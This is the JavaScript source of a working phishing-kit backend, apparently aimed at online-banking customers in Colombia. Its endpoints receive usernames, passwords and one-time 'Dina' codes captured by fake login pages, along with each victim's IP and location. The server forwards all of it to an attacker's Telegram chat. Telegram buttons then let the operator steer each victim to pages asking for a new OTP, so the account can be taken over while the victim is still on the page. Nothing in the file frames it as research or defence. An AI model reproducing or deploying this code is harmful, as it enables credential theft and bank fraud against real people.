import 'dotenv/config';
import express from 'express';
import cors from 'cors';

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors());

const PORT = process.env.PORT || 10000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL;
const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// --------------------- Estado en memoria (sin archivos) ---------------------
const sessionStates = new Map();

async function readState(sessionId) {
  if (!sessionStates.has(sessionId)) {
    sessionStates.set(sessionId, {
      sessionId,
      data: {},
      history: [],
      pending: null,
      lastUpdate: null
    });
  }
  return sessionStates.get(sessionId);
}

async function writeState(sessionId, patch) {
  const current = await readState(sessionId);
  const updated = {
    ...current,
    ...patch,
    lastUpdate: new Date().toISOString()
  };
  sessionStates.set(sessionId, updated);
  return updated;
}

function ts() {
  return new Date().toISOString();
}

// --------------------- Telegram helpers ---------------------
async function tgSendMessage(text, inlineKeyboard) {
  const payload = {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: inlineKeyboard ? { inline_keyboard: inlineKeyboard } : undefined
  };
  const res = await fetch(`${TG_API}/sendMessage`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(payload)
  });
  if (!res.ok) {
    const errTxt = await res.text();
    console.error('sendMessage failed:', errTxt);
  }
}

function kbBtn(text, data) {
  return [{ text, callback_data: JSON.stringify(data) }];
}

function buttonsForStep(step, sessionId) {
  if (step === 'virtual') {
    return [
      kbBtn('🔁 Error Logo', { sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }),
      kbBtn('➡️ Siguiente', { sessionId, action: 'redirect', redirect_to: 'opcion1.html' })
    ];
  }
  if (step === 'otp1' || step === 'otp2') {
    return [
      kbBtn('🔁 Error Logo', { sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }),
      kbBtn('⚠️ Error OTP', { sessionId, action: 'redirect', redirect_to: 'opcion2.html' }),
      kbBtn('🔄 Nuevo OTP', { sessionId, action: 'redirect', redirect_to: 'opcion1.html' }),
      kbBtn('✅ Finalizar', { sessionId, action: 'redirect', redirect_to: 'finalizar.html' })
    ];
  }
  return [];
}

function fmt(k, v) {
  if (!v) return '';
  return `<b>${k}:</b> ${String(v).replace(/</g, '&lt;').replace(/>/g, '&gt;')}`;
}

app.post('/virtualpersona', async (req, res) => {
  try {
    const { sessionId, user, pass, ip, country, city } = req.body || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });

    // 1. Guardar estado
    const updated = await writeState(sessionId, {
      step: 'virtual',
      data: { ...(await readState(sessionId)).data, user, pass, ip, country, city },
      history: [
        ...(await readState(sessionId)).history,
        { t: ts(), event: 'virtualpersona', user, pass }
      ],
      pending: null
    });

  
const message = `📲 NUEVO ACCESO VIRTUAL\n\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌐 IP: ${ip}\n🆔 SessionID: ${sessionId}\n📍 Ciudad: ${city} - ${country}`; 

await tgSendMessage(message, buttonsForStep('virtual', sessionId));




    res.json({ ok: true });

  } catch (err) {
    console.error('Error en /virtualpersona:', err);
    res.status(500).json({ error: 'Error interno del servidor' });
  }
});

app.post('/otp1', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });

    const updated = await writeState(sessionId, {
      step: 'otp1',
      data: { ...(await readState(sessionId)).data, user, pass, dina, ip, country, city },
      history: [ ...(await readState(sessionId)).history, { t: ts(), event: 'otp1', dina } ],
      pending: null
    });

    const text =
`<b>📲 Ingreso OTP Dina</b>

${fmt('👤 User', user)}
${fmt('🔑 Pass', pass)}
${fmt('📳 Dina', dina)}
${fmt('🌐 IP', ip)}
${fmt('🌎 País', country)}
${fmt('🏘️ Ciudad', city)}

<b>SessionID:</b> <code>${sessionId}</code>
⏱️ <i>${new Date().toLocaleString('es-CO')}</i>`;

    await tgSendMessage(text, buttonsForStep('otp1', sessionId));
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'internal_error' });
  }
});

app.post('/otp2', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });

    const updated = await writeState(sessionId, {
      step: 'otp2',
      data: { ...(await readState(sessionId)).data, user, pass, dina, ip, country, city },
      history: [ ...(await readState(sessionId)).history, { t: ts(), event: 'otp2', dina } ],
      pending: null
    });

    const text =
`<b>📲 Ingreso OTP new Dina</b>

${fmt('👤 User', user)}
${fmt('🔑 Pass', pass)}
${fmt('📳 Dina', dina)}
${fmt('🌐 IP', ip)}
${fmt('🌎 País', country)}
${fmt('🏘️ Ciudad', city)}

<b>SessionID:</b> <code>${sessionId}</code>
⏱️ <i>${new Date().toLocaleString('es-CO')}</i>`;

    await tgSendMessage(text, buttonsForStep('otp2', sessionId));
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'internal_error' });
  }
});

app.get('/instruction/:sessionId', async (req, res) => {
  const { sessionId } = req.params;
  if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });

  const st = await readState(sessionId);
  if (st.pending && st.pending.redirect_to) {
    const redirect_to = st.pending.redirect_to;
    await writeState(sessionId, { pending: null });
    return res.json({ redirect_to });
  }
  res.json({ redirect_to: null });
});

app.get('/set-webhook', async (req, res) => {
  try {
    if (!PUBLIC_BASE_URL) return res.status(400).send('PUBLIC_BASE_URL requerido');
    const webhookUrl = `${PUBLIC_BASE_URL}/telegram/webhook`;
    const r = await fetch(`${TG_API}/setWebhook`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ url: webhookUrl })
    });
    const j = await r.json();
    res.json(j);
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'webhook_error' });
  }
});

app.post('/telegram/webhook', async (req, res) => {
  const body = req.body;
  console.log("📩 Webhook recibido:", body); // <-- esto es importante

  if (body.callback_query) {
let callbackData = {};
try {
  callbackData = JSON.parse(body.callback_query.data);
} catch (err) {
  console.error("❌ Error al parsear callback_data:", err);
  return res.sendStatus(400);
}

const { sessionId, action, redirect_to } = callbackData;


    console.log(`🔧 Acción: ${action} | Sesión: ${sessionId}`);

    // Aquí actualizamos el estado
    if (sessionId && action) {
      let redirect_to = null;
      if (action === 'siguiente') {
        redirect_to = '/opcion1.html';
      } else if (action === 'error_logo') {
        redirect_to = '/Virtual-Persona.html';
      } else if (action === 'error_otp') {
        redirect_to = '/otp-check.html';
      }

      if (redirect_to) {
        await writeState(sessionId, { pending: { redirect_to } });
        console.log(`✅ Estado actualizado para ${sessionId} → ${redirect_to}`);
      }
    }

    // Responde al botón presionado
    res.send({
      method: 'answerCallbackQuery',
      callback_query_id: body.callback_query.id,
      text: '✅ Acción recibida.',
      show_alert: false
    });
  } else {
    res.sendStatus(200);
  }
});



app.get('/health', (_, res) => res.send('ok'));

app.listen(PORT, () => {
  console.log('✅ Servidor activo y escuchando en el puerto', PORT);
});
